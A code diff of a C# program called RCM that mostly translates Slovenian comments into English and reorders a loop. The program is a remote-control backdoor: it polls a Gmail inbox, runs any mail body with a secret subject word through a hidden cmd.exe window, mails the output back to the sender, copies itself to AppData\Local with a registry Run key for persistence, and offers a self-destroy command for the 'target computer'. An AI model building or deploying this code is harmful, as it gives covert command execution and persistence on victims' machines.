@@ -17,57 +17,48 @@ namespace RCM
     {
         static void Main(string[] args)
         {
-            //make me autorun
+            //Call function to make this program run automatic on start up
             bool autorun = true;
 
-            //podatki o email racunu
+            //data of email, where app will be listening
             string username = "USERNAME@gmail.com";
             string password = "PASSWORD";
 
-            //podatki za sprejem mailov
+            //data to receive mails
             string hostname = "pop.gmail.com";
             int port = 995;
             bool useSsl = true;
-           
-            //podatki za posiljanje mailov
+
+            //data to send mails
             string outHost = "smtp.gmail.com";
             int outPort = 587;
             bool outSsl = true;
 
-            //tajno geslo, ki mora biti v Subject, da program zazna vsebino
+            //secret word that must be in Subject to detect and execute the body command
             string secret = "zadeva";
 
-            //izbriši prebrano sporočilo iz serverja (na gmail ni potrebno, ker zazna mail samo enkrat)
+            //delete mail after executing (not working on GMail, and it isn't required for GMail)
             bool deleteMessages = false;
 
-            //interval ponavljanja v ms
+            //check for new mails on interval (in millisecond)
             int interval = 60 * 1000;
             /*
              * REPLAY SETTINGS
-             * Če zelite, da vam program v odgovor pošlje output terminala,
-             * je potrebno pred ukazom vpisati (replay_word) replay:
+			 * If you want that the app will send the terminal output back to the sender,
+			 * you need to enter replay_word before the command in the body
              * 
-             * primer: "ping 192.168.1.1"
-             * Če hočemo odgovor bo vsebina maila izgledala "replay:ping 192.168.1.1"
+             * Example: "ping 192.168.1.1"
+             * It should look like "replay:ping 192.168.1.1"
              */
             string replay_word = "replay:";
+
             /*
-             * SELF-DESTROY body: (destroyMe) self-destroy
-             * delete key in startup
-             * delete file (temp??)
+             * SELF-DESTROY 
+             * if you want to delete the app from the target computer
+             * send the destroyMe word in the body
              */
             string destroyMe = "self-destroy";
-            /*
-             * Posiljanje:
-             * -na siolu ne deluje,
-             * -na gmail je potrebno onemogočiti varno prijavo
-            
-             * Branje:
-             * Deluje na siol.net
-             * Problem pri gmail.com -ko enkrat prebere mail, ga naslednič ne zazna več ?!? 
-             * Na gmail.com brisanje sporočil ne deluje!
-             */
-            
+
             ///////////////////////////////////////////////////////////////////////////////////////////
             ///////////////////////////////////////////////////////////////////////////////////////////
             /*
@@ -89,25 +80,27 @@ namespace RCM
             {
                 List<Message> sporocila = FetchAllMessages(hostname, port, useSsl, username, password);
 
-                foreach (Message s in sporocila)
+                for (int q = sporocila.Count - 1; q >= 0; q--)
+                //foreach (Message s in sporocila)
                 {
-                    //preberemo Subject sprorocila
+                    Message s = sporocila[q];
+                    //get the Subject of the Message
                     string subject = s.Headers.Subject.ToString();
 
-                    if (subject == secret) //ce se ujema z skrivno besedo
+                    if (subject == secret) //if the mail has the secret word in the Subject
                     {
-                        string mid = s.Headers.MessageId.ToString().Trim(); //id sporocila
-                        string content = s.MessagePart.MessageParts[0].GetBodyAsText().Trim(); //potegnemo vsebino
+                        string mid = s.Headers.MessageId.ToString().Trim(); //Get ID of the message
+                        string content = s.MessagePart.MessageParts[0].GetBodyAsText().Trim(); //Get the body of the message
 
-                        //če obstaja vsebina
                         if (!String.IsNullOrEmpty(content))
                         {
-                            if (content == destroyMe)
+                            if (content == destroyMe) //if the destroy was required
                             {
                                 DestroyMe();
                             }
+
+                            //check if the output was required
                             bool replay = false;
-                            //ugotovimo ali je zahtevan odgovor
                             int rep_len = replay_word.Length;
                             if (content.Substring(0, rep_len) == replay_word)
                             {
@@ -115,7 +108,7 @@ namespace RCM
                                 content = content.Substring(rep_len);
                             }
 
-                            //izpis podatkov
+                            //Write the message data
                             Console.WriteLine("-----------------------------------------------------------------");
                             Console.WriteLine("Requested response: " + replay);
                             Console.WriteLine("Deleteing message: " + deleteMessages);
@@ -125,7 +118,6 @@ namespace RCM
                             if (replay)
                             {
                                 //execute and save output, then send it back to sender
-
                                 string sender = s.Headers.From.Address;
                                 Console.WriteLine("Output sending to:" + sender);
 
@@ -138,10 +130,11 @@ namespace RCM
                             }
                             else
                             {
-                                runCMD_NoFeedback(content);
+                                runCMD_NoFeedback(content); //run command with no output
                             }
                         }
 
+                        //if the deleting was required
                         if (deleteMessages)
                         {
                             bool delete = DeleteMessageByMessageId(hostname, port, useSsl, username, password, mid);
@@ -149,17 +142,23 @@ namespace RCM
                         }
                     }
                 }
-                //Console.WriteLine("-------------------------------------------------");                
+
+                //sleep for a while, then repeat the loop
                 Thread.Sleep(interval);
             }
         }
 
         private static void autoStart()
         {
-            string exepath = Assembly.GetEntryAssembly().Location;
-            string path = Path.GetDirectoryName(exepath); //mapa iz katere je zagnan program
+            /* Object: 
+                -copy file and the OpenPop.dll to AppData\Local
+                -add file to autorun registry
+            */
 
-            //C:\Users\Uporabnik\AppData\Local
+            string exepath = Assembly.GetEntryAssembly().Location;
+            string path = Path.GetDirectoryName(exepath); //folder we are into right now
+
+            //C:\Users\User\AppData\Local
             string userPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
             string toRun = userPath + @"\RCM";
 
@@ -168,9 +167,9 @@ namespace RCM
 
             if (path == toRun)
             {
-                //datoteka je v pravem fajlu
-                //C:\Users\Uporabnik\AppData\Local\RCM
-                if (checkWritableKey())
+                //the files are on the right place
+                //C:\Users\User\AppData\Local\RCM
+                if (checkWritableKey()) //add key again if writable
                 {
                     RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                     rk.SetValue(System.Diagnostics.Process.GetCurrentProcess().ProcessName, path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
@@ -190,17 +189,17 @@ namespace RCM
                     {
                         //copy OpenPop
                         File.Copy(path + @"\OpenPop.dll", toRun + @"\OpenPop.dll");
-
                     }
-                    catch {  }
+                    catch { }
 
                     try
                     {
+                        //copy application .exe
                         File.Copy(path + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe", toRun + @"\" + System.Diagnostics.Process.GetCurrentProcess().ProcessName + ".exe");
                     }
-                    catch {  }
+                    catch { }
 
-                    //zapisemo se v registre
+                    //write to regedit
                     if (checkWritableKey())
                     {
                         RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
@@ -231,6 +230,7 @@ namespace RCM
             catch { }
 
             //delete RCM.exe
+            //OpenPop.dll will not be deleted
             try
             {
                 var exepath = Assembly.GetEntryAssembly().Location;
@@ -242,7 +242,7 @@ namespace RCM
             catch { }
         }
 
-        private static bool IsDirectoryWritable(string dirPath)
+        private static bool IsDirectoryWritable(string dirPath) //check if we have access to the folder
         {
             try
             {
@@ -263,7 +263,7 @@ namespace RCM
             }
         }
 
-        private static bool checkWritableKey()
+        private static bool checkWritableKey() //check if we have access to the startUp key
         {
             try
             {
@@ -392,7 +392,7 @@ namespace RCM
             System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
             startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
             startInfo.FileName = "cmd.exe";
-            startInfo.Arguments = "/C "+ command;
+            startInfo.Arguments = "/C " + command;
             process.StartInfo = startInfo;
             process.Start();
         }
